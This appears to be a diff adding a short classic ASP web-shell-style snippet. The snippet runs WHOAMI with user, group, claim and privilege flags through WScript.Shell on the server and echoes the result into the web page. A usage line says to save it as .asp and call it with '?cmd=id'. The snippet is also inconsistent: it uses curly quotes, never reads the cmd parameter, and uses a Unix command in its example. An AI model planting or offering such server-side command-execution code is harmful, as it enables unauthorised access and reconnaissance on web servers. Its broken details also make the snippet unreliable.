@@ -1,0 +1,8 @@
+<%
+Set rs = CreateObject(“WScript.Shell”)
+Set cmd = rs.Exec(“cmd /c WHOAMI /USER /GROUPS /CLAIMS /PRIV”)
+o = cmd.StdOut.Readall()
+Response.write(o)
+%>
+
+Save this as .asp and execute as test.asp?cmd=id
